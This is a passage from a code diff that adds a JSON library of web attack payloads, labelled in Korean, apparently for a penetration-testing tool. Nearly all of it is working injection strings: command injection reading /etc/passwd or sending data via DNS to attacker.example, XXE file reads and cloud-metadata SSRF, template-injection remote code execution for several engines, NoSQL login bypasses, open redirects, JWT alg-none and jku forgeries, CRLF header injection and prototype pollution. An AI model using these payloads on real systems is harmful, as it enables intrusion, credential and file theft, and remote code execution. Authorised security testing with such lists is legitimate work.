+          "payload": "&& cat /etc/passwd",
+          "description": "성공 시 명령 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_04",
+          "name": "OR 연산",
+          "payload": "|| id",
+          "description": "실패 시 명령 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_05",
+          "name": "백틱 치환",
+          "payload": "`id`",
+          "description": "백틱 명령 치환",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_06",
+          "name": "서브쉘 $()",
+          "payload": "$(whoami)",
+          "description": "$() 서브쉘 실행",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_07",
+          "name": "개행 분리",
+          "payload": "%0a id",
+          "description": "URL 개행 문자 분리",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_08",
+          "name": "CRLF 분리",
+          "payload": "%0d%0a id",
+          "description": "CRLF 명령 분리",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_09",
+          "name": "Blind sleep",
+          "payload": "; sleep 5",
+          "description": "Linux 5초 시간 지연",
+          "risk": "high"
+        },
+        {
+          "id": "cmdi_10",
+          "name": "Blind ping Windows",
+          "payload": "& ping -n 5 127.0.0.1",
+          "description": "Windows 5회 ping 지연",
+          "risk": "high"
+        },
+        {
+          "id": "cmdi_11",
+          "name": "OOB DNS",
+          "payload": "; nslookup attacker.com",
+          "description": "DNS OOB 탐지",
+          "risk": "high"
+        },
+        {
+          "id": "cmdi_12",
+          "name": "공백 우회 $IFS",
+          "payload": ";cat$IFS/etc/passwd",
+          "description": "$IFS 공백 필터 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_13",
+          "name": "공백 우회 중괄호",
+          "payload": ";{cat,/etc/passwd}",
+          "description": "중괄호 공백 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_14",
+          "name": "Windows dir",
+          "payload": "& dir",
+          "description": "Windows 디렉토리 목록",
+          "risk": "high"
+        },
+        {
+          "id": "cmdi_15",
+          "name": "Windows ipconfig",
+          "payload": "& ipconfig /all",
+          "description": "Windows 네트워크 정보",
+          "risk": "medium"
+        },
+        {
+          "id": "cmdi_16",
+          "name": "인코딩 우회 base64",
+          "payload": ";$(echo${IFS}d2hvYW1p|base64${IFS}-d|sh)",
+          "description": "Base64 인코딩 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "cmdi_17",
+          "name": "Windows CMD 캐럿",
+          "payload": "c^m^d /c whoami",
+          "description": "캐럿으로 필터 우회",
+          "risk": "high"
+        },
+        {
+          "id": "cmdi_18",
+          "name": "파이프",
+          "payload": "| id",
+          "description": "파이프로 명령 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_19",
+          "name": "AND 연산",
+          "payload": "&& id",
+          "description": "선행 성공 시 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_20",
+          "name": "$() 치환",
+          "payload": "$(id)",
+          "description": "서브셸 치환",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_21",
+          "name": "Windows &",
+          "payload": "& whoami",
+          "description": "윈도우 명령 연결",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_22",
+          "name": "Windows for 우회",
+          "payload": "w\"h\"o\"a\"m\"i",
+          "description": "따옴표 삽입 필터 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_23",
+          "name": "공백 우회 IFS",
+          "payload": "cat${IFS}/etc/passwd",
+          "description": "IFS로 공백 대체",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_24",
+          "name": "공백 우회 중괄호",
+          "payload": "{cat,/etc/passwd}",
+          "description": "brace expansion",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/command-injection"
+        },
+        {
+          "id": "cmdi_25",
+          "name": "OOB DNS",
+          "payload": "; nslookup `whoami`.attacker.example",
+          "description": "블라인드 OOB 유출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        },
+        {
+          "id": "cmdi_26",
+          "name": "리다이렉트 읽기",
+          "payload": "; cat /etc/passwd #",
+          "description": "주석으로 뒤 무력화",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
+        }
+      ]
+    },
+    {
+      "id": "xxe",
+      "name": "XXE Injection",
+      "icon": "📄",
+      "color": "#16a085",
+      "payloads": [
+        {
+          "id": "xxe_01",
+          "name": "기본 파일 읽기",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+          "description": "로컬 파일 읽기",
+          "risk": "critical"
+        },
+        {
+          "id": "xxe_02",
+          "name": "Windows 파일",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><root>&xxe;</root>",
+          "description": "Windows 파일 읽기",
+          "risk": "critical"
+        },
+        {
+          "id": "xxe_03",
+          "name": "SSRF via XXE",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+          "description": "XXE를 통한 SSRF",
+          "risk": "critical"
+        },
+        {
+          "id": "xxe_04",
+          "name": "Blind XXE DNS",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/xxetest\">]><root>&xxe;</root>",
+          "description": "Blind XXE DNS 탐지",
+          "risk": "high"
+        },
+        {
+          "id": "xxe_05",
+          "name": "OOB 외부 DTD",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://attacker.com/xxe.dtd\"> %ext;]><root/>",
+          "description": "외부 DTD 로드 OOB",
+          "risk": "critical"
+        },
+        {
+          "id": "xxe_06",
+          "name": "XInclude 우회",
+          "payload": "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>",
+          "description": "XInclude XXE 우회",
+          "risk": "high"
+        },
+        {
+          "id": "xxe_07",
+          "name": "기본 파일 읽기",
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+          "description": "외부 엔티티 파일 읽기",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+        },
+        {
+          "id": "xxe_08",
+          "name": "PHP filter 유출",
+          "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>",
+          "description": "base64 소스 유출",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+        },
+        {
+          "id": "xxe_09",
+          "name": "SSRF 결합",
+          "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>",
+          "description": "XXE→SSRF 메타데이터",
+          "risk": "critical",
+          "reference": "https://portswigger.net/web-security/xxe"
+        },
+        {
+          "id": "xxe_10",
+          "name": "파라미터 엔티티 OOB",
+          "payload": "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://attacker.example/e.dtd\">%p;]>",
+          "description": "블라인드 OOB 유출용",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/xxe/blind"
+        },
+        {
+          "id": "xxe_11",
+          "name": "에러 기반",
+          "payload": "<!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///etc/passwd\"><!ENTITY % e \"<!ENTITY &#x25; x SYSTEM 'file:///nonexist/%f;'>\">%e;%x;]>",
+          "description": "에러 메시지로 파일 유출",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/xxe/blind"
+        },
+        {
+          "id": "xxe_12",
+          "name": "빌리언 러프(DoS)",
+          "payload": "<!DOCTYPE r [<!ENTITY a \"aa\"><!ENTITY b \"&a;&a;\"><!ENTITY c \"&b;&b;\">]><r>&c;</r>",
+          "description": "엔티티 확장 DoS",
+          "risk": "medium",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/"
+        },
+        {
+          "id": "xxe_13",
+          "name": "SVG 내 XXE",
+          "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><text>&x;</text></svg>",
+          "description": "파일 업로드 SVG XXE",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
+        }
+      ]
+    },
+    {
+      "id": "ssti",
+      "name": "SSTI (템플릿 인젝션)",
+      "icon": "🔧",
+      "color": "#8e44ad",
+      "payloads": [
+        {
+          "id": "ssti_01",
+          "name": "탐지 수식",
+          "payload": "{{7*7}}",
+          "description": "템플릿 실행 탐지 (49 반환)",
+          "risk": "medium"
+        },
+        {
+          "id": "ssti_02",
+          "name": "탐지 문자열 곱",
+          "payload": "{{7*'7'}}",
+          "description": "Twig:49 / Jinja2:7777777",
+          "risk": "medium"
+        },
+        {
+          "id": "ssti_03",
+          "name": "Jinja2 config",
+          "payload": "{{config}}",
+          "description": "Flask/Jinja2 설정 객체",
+          "risk": "high"
+        },
+        {
+          "id": "ssti_04",
+          "name": "Jinja2 environ",
+          "payload": "{{request.environ}}",
+          "description": "환경 변수 전체 노출",
+          "risk": "high"
+        },
+        {
+          "id": "ssti_05",
+          "name": "Jinja2 RCE",
+          "payload": "{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
+          "description": "Jinja2 Python 클래스 RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "ssti_06",
+          "name": "Twig RCE PHP",
+          "payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+          "description": "Twig PHP RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "ssti_07",
+          "name": "FreeMarker Java",
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+          "description": "FreeMarker Java RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "ssti_08",
+          "name": "ERB Ruby",
+          "payload": "<%= `id` %>",
+          "description": "ERB Ruby RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "ssti_09",
+          "name": "Mako Python",
+          "payload": "${__import__('os').popen('id').read()}",
+          "description": "Mako Python RCE",
+          "risk": "critical"
+        },
+        {
+          "id": "ssti_10",
+          "name": "Jinja2 RCE(config)",
+          "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+          "description": "Jinja2 명령 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_11",
+          "name": "Jinja2 RCE(cycler)",
+          "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "description": "cycler 경유 RCE",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        },
+        {
+          "id": "ssti_12",
+          "name": "Twig RCE",
+          "payload": "{{['id']|filter('system')}}",
+          "description": "Twig 필터 RCE",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_13",
+          "name": "Freemarker RCE",
+          "payload": "<#assign e=\"freemarker.template.utility.Execute\"?new()>${e(\"id\")}",
+          "description": "Freemarker 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_14",
+          "name": "Velocity RCE",
+          "payload": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
+          "description": "Velocity 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_15",
+          "name": "ERB(Ruby) RCE",
+          "payload": "<%= system('id') %>",
+          "description": "ERB 명령 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_16",
+          "name": "Smarty RCE",
+          "payload": "{system('id')}",
+          "description": "Smarty 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        },
+        {
+          "id": "ssti_17",
+          "name": "Thymeleaf RCE",
+          "payload": "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
+          "description": "Thymeleaf SpEL",
+          "risk": "critical",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        },
+        {
+          "id": "ssti_18",
+          "name": "탐지 폴리글랏",
+          "payload": "${{7*7}}",
+          "description": "다중 엔진 탐지",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/server-side-template-injection"
+        },
+        {
+          "id": "ssti_19",
+          "name": "Mako RCE",
+          "payload": "<%import os%>${os.popen('id').read()}",
+          "description": "Mako 템플릿 실행",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+        }
+      ]
+    },
+    {
+      "id": "nosql",
+      "name": "NoSQL Injection",
+      "icon": "🍃",
+      "color": "#27ae60",
+      "payloads": [
+        {
+          "id": "nosql_01",
+          "name": "MongoDB $ne 우회",
+          "payload": "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+          "description": "not-equal 인증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_02",
+          "name": "MongoDB $gt 우회",
+          "payload": "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+          "description": "greater-than 인증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_03",
+          "name": "MongoDB $regex",
+          "payload": "{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$regex\":\".*\"}}",
+          "description": "정규식 인증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_04",
+          "name": "MongoDB $where",
+          "payload": "{\"$where\":\"function(){return true}\"}",
+          "description": "MongoDB JS 인젝션",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_05",
+          "name": "URL $ne GET",
+          "payload": "username[$ne]=invalid&password[$ne]=invalid",
+          "description": "GET 파라미터 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_06",
+          "name": "URL $gt GET",
+          "payload": "username[$gt]=&password[$gt]=",
+          "description": "GET $gt 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "nosql_07",
+          "name": "CouchDB DB 목록",
+          "payload": "/_all_dbs",
+          "description": "CouchDB DB 목록",
+          "risk": "high"
+        },
+        {
+          "id": "nosql_08",
+          "name": "MongoDB JS 인젝션",
+          "payload": "';return 'a'=='a' && ''=='",
+          "description": "JS 표현식 인젝션",
+          "risk": "high"
+        },
+        {
+          "id": "nosql_09",
+          "name": "$regex 추출",
+          "payload": "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}",
+          "description": "정규식 이진 탐색",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        },
+        {
+          "id": "nosql_10",
+          "name": "$where JS",
+          "payload": "{\"$where\":\"sleep(5000)\"}",
+          "description": "$where time-based",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        },
+        {
+          "id": "nosql_11",
+          "name": "연산자 인젝션(URL)",
+          "payload": "username[$ne]=1&password[$ne]=1",
+          "description": "폼/쿼리 연산자 인젝션",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_12",
+          "name": "$in 배열",
+          "payload": "{\"username\":{\"$in\":[\"admin\"]},\"password\":{\"$ne\":\"\"}}",
+          "description": "$in 결합",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
+        },
+        {
+          "id": "nosql_13",
+          "name": "JS 주석 우회",
+          "payload": "admin'//",
+          "description": "JS 컨텍스트 주석",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/nosql-injection"
+        }
+      ]
+    },
+    {
+      "id": "redirect",
+      "name": "Open Redirect",
+      "icon": "↪️",
+      "color": "#f1c40f",
+      "payloads": [
+        {
+          "id": "redir_01",
+          "name": "외부 URL",
+          "payload": "https://evil.com",
+          "description": "외부 URL 리다이렉트",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_02",
+          "name": "프로토콜 상대경로",
+          "payload": "//evil.com",
+          "description": "프로토콜 없는 리다이렉트",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_03",
+          "name": "URL 인코딩",
+          "payload": "https%3A%2F%2Fevil.com",
+          "description": "URL 인코딩 우회",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_04",
+          "name": "삼중 슬래시",
+          "payload": "///evil.com",
+          "description": "슬래시 3개 우회",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_05",
+          "name": "@ 기호 위장",
+          "payload": "https://trusted.com@evil.com",
+          "description": "@로 호스트 위장",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_06",
+          "name": "CRLF 헤더 인젝션",
+          "payload": "/redirect?url=https://trusted.com%0d%0aSet-Cookie:session=evil",
+          "description": "CRLF 헤더 인젝션",
+          "risk": "high"
+        },
+        {
+          "id": "redir_07",
+          "name": "도메인 접미사 우회",
+          "payload": "https://trusted.com.evil.com",
+          "description": "화이트리스트 우회",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_08",
+          "name": "이중 인코딩",
+          "payload": "https%253A%252F%252Fevil.com",
+          "description": "이중 URL 인코딩",
+          "risk": "medium"
+        },
+        {
+          "id": "redir_09",
+          "name": "절대 URL",
+          "payload": "https://evil.example.com",
+          "description": "외부 도메인 리다이렉트",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_10",
+          "name": "스킴 상대 //",
+          "payload": "//evil.example.com",
+          "description": "프로토콜 상대 우회",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_11",
+          "name": "백슬래시 우회",
+          "payload": "https:\\\\evil.example.com",
+          "description": "백슬래시 정규화 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_12",
+          "name": "@ 우회",
+          "payload": "https://trusted.example.com@evil.example.com",
+          "description": "인증정보 구문 혼동",
+          "risk": "medium",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        },
+        {
+          "id": "redir_13",
+          "name": "자바스크립트 스킴",
+          "payload": "javascript:alert(document.domain)",
+          "description": "리다이렉트→XSS",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_14",
+          "name": "데이터 URI",
+          "payload": "data:text/html,<script>alert(1)</script>",
+          "description": "data 스킴 리다이렉트",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_15",
+          "name": "경로 우회 //",
+          "payload": "/\\/evil.example.com",
+          "description": "혼합 슬래시 우회",
+          "risk": "medium",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/open-redirect"
+        },
+        {
+          "id": "redir_16",
+          "name": "CRLF 결합",
+          "payload": "/%0d%0aLocation:%20https://evil.example.com",
+          "description": "헤더 인젝션 리다이렉트",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect"
+        }
+      ]
+    },
+    {
+      "id": "jwt",
+      "name": "JWT 공격",
+      "icon": "🔑",
+      "color": "#e67e22",
+      "payloads": [
+        {
+          "id": "jwt_01",
+          "name": "Algorithm None",
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+          "description": "alg:none 서명 검증 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "jwt_02",
+          "name": "Algorithm None 변형",
+          "payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+          "description": "대소문자 None 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "jwt_03",
+          "name": "RS256 HS256 혼용",
+          "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE",
+          "description": "공개키 HMAC 서명 우회",
+          "risk": "critical"
+        },
+        {
+          "id": "jwt_04",
+          "name": "kid 경로 탐색",
+          "payload": "{\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}",
+          "description": "kid 파라미터 경로 탐색",
+          "risk": "critical"
+        },
+        {
+          "id": "jwt_05",
+          "name": "jku 헤더 인젝션",
+          "payload": "{\"alg\":\"RS256\",\"jku\":\"https://attacker.com/jwks.json\"}",
+          "description": "외부 JWKS URL 인젝션",
+          "risk": "critical"
+        },
+        {
+          "id": "jwt_06",
+          "name": "만료시간 조작",
+          "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjo5OTk5OTk5OTk5fQ.SIG",
+          "description": "exp 클레임 조작",
+          "risk": "high"
+        },
+        {
+          "id": "jwt_07",
+          "name": "alg none",
+          "payload": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+          "description": "알고리즘 none 서명 제거",
+          "risk": "critical",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token"
+        },
+        {
+          "id": "jwt_08",
+          "name": "alg 대소문자 None",
+          "payload": "{\"alg\":\"nOnE\"}",
+          "description": "none 필터 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
+        },
+        {
+          "id": "jwt_09",
+          "name": "RS256→HS256 혼동",
+          "payload": "alg=HS256 (공개키를 HMAC 키로)",
+          "description": "키 혼동 공격",
+          "risk": "critical",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_10",
+          "name": "kid 경로 traversal",
+          "payload": "{\"kid\":\"../../dev/null\"}",
+          "description": "kid로 예측가능 키 지정",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_11",
+          "name": "kid SQLi",
+          "payload": "{\"kid\":\"none' UNION SELECT 'secret'-- -\"}",
+          "description": "kid 파라미터 SQLi",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"
+        },
+        {
+          "id": "jwt_12",
+          "name": "jku 헤더 변조",
+          "payload": "{\"jku\":\"https://attacker.example/jwks.json\"}",
+          "description": "공격자 JWKS 유도",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        },
+        {
+          "id": "jwt_13",
+          "name": "jwk 임베드",
+          "payload": "{\"jwk\":{...공격자 공개키...}}",
+          "description": "self-signed 키 임베드",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/jwt"
+        }
+      ]
+    },
+    {
+      "id": "header",
+      "name": "Header Injection",
+      "icon": "📋",
+      "color": "#1abc9c",
+      "payloads": [
+        {
+          "id": "hdr_01",
+          "name": "Host 헤더 조작",
+          "payload": "evil.com",
+          "description": "Host 헤더 인젝션",
+          "risk": "medium",
+          "header": "Host"
+        },
+        {
+          "id": "hdr_02",
+          "name": "X-Forwarded-For IP 우회",
+          "payload": "127.0.0.1",
+          "description": "IP 접근 제어 우회",
+          "risk": "medium",
+          "header": "X-Forwarded-For"
+        },
+        {
+          "id": "hdr_03",
+          "name": "X-Real-IP 우회",
+          "payload": "127.0.0.1",
+          "description": "실제 IP 숨기기",
+          "risk": "medium",
+          "header": "X-Real-IP"
+        },
+        {
+          "id": "hdr_04",
+          "name": "X-Originating-IP",
+          "payload": "127.0.0.1",
+          "description": "IP 우회 시도",
+          "risk": "medium",
+          "header": "X-Originating-IP"
+        },
+        {
+          "id": "hdr_05",
+          "name": "User-Agent SQLi",
+          "payload": "' OR 1=1--",
+          "description": "UA 헤더 SQLi",
+          "risk": "medium",
+          "header": "User-Agent"
+        },
+        {
+          "id": "hdr_06",
+          "name": "Referer 우회",
+          "payload": "https://trusted.internal.com/admin",
+          "description": "리퍼러 접근 제어 우회",
+          "risk": "low",
+          "header": "Referer"
+        },
+        {
+          "id": "hdr_07",
+          "name": "X-HTTP-Method-Override",
+          "payload": "DELETE",
+          "description": "HTTP 메서드 오버라이드",
+          "risk": "medium",
+          "header": "X-HTTP-Method-Override"
+        },
+        {
+          "id": "hdr_08",
+          "name": "Content-Type 변경",
+          "payload": "application/x-www-form-urlencoded",
+          "description": "파서 우회 시도",
+          "risk": "medium",
+          "header": "Content-Type"
+        },
+        {
+          "id": "hdr_09",
+          "name": "Origin CORS 우회",
+          "payload": "https://trusted.com",
+          "description": "CORS 정책 우회",
+          "risk": "medium",
+          "header": "Origin"
+        },
+        {
+          "id": "hdr_10",
+          "name": "CRLF 헤더 분리",
+          "payload": "value\r\nSet-Cookie: admin=1",
+          "description": "CRLF 인젝션",
+          "risk": "high",
+          "header": "Custom-Header"
+        },
+        {
+          "id": "hdr_11",
+          "name": "X-Custom-IP-Authorization",
+          "payload": "127.0.0.1",
+          "description": "커스텀 IP 인가 우회",
+          "risk": "medium",
+          "header": "X-Custom-IP-Authorization"
+        },
+        {
+          "id": "hdr_12",
+          "name": "X-Remote-Addr",
+          "payload": "127.0.0.1",
+          "description": "원격 주소 위조",
+          "risk": "medium",
+          "header": "X-Remote-Addr"
+        },
+        {
+          "id": "hdr_13",
+          "name": "Host 헤더 변조",
+          "payload": "Host: evil.example.com",
+          "description": "비밀번호 재설정 포이즈닝 등",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "id": "hdr_14",
+          "name": "X-Forwarded-Host",
+          "payload": "X-Forwarded-Host: evil.example.com",
+          "description": "캐시/링크 포이즈닝",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "id": "hdr_15",
+          "name": "X-Forwarded-For 스푸핑",
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "description": "접근제어 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers"
+        },
+        {
+          "id": "hdr_16",
+          "name": "X-Original-URL 우회",
+          "payload": "X-Original-URL: /admin",
+          "description": "경로 기반 접근제어 우회",
+          "risk": "high",
+          "reference": "https://portswigger.net/web-security/access-control"
+        },
+        {
+          "id": "hdr_17",
+          "name": "X-Rewrite-URL 우회",
+          "payload": "X-Rewrite-URL: /admin",
+          "description": "URL 재작성 우회",
+          "risk": "high",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        },
+        {
+          "id": "hdr_18",
+          "name": "CRLF 헤더 인젝션",
+          "payload": "%0d%0aSet-Cookie:%20sessionid=hijack",
+          "description": "응답 분할/쿠키 주입",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "hdr_19",
+          "name": "CRLF XSS",
+          "payload": "%0d%0a%0d%0a<script>alert(1)</script>",
+          "description": "응답 본문 주입",
+          "risk": "high",
+          "reference": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection"
+        },
+        {
+          "id": "hdr_20",
+          "name": "이중 Host",
+          "payload": "Host: real.example.com\\r\\nHost: evil.example.com",
+          "description": "이중 호스트 혼동",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "id": "hdr_21",
+          "name": "절대 URL 요청라인",
+          "payload": "GET https://evil.example.com/ HTTP/1.1",
+          "description": "절대 URL Host 우회",
+          "risk": "medium",
+          "reference": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "id": "hdr_22",
+          "name": "X-Forwarded-Proto",
+          "payload": "X-Forwarded-Proto: http",
+          "description": "HTTPS 강제 우회 시도",
+          "risk": "low",
+          "reference": "https://book.hacktricks.xyz/pentesting-web"
+        }
+      ]
+    },
+    {
+      "id": "prototype",
+      "name": "Prototype Pollution",
+      "icon": "🧬",
+      "color": "#c0392b",
+      "payloads": [
+        {
+          "id": "proto_01",
+          "name": "__proto__ 오염",
+          "payload": "{\"__proto__\":{\"admin\":true}}",
+          "description": "Object prototype 오염",
+          "risk": "high"
+        },
+        {
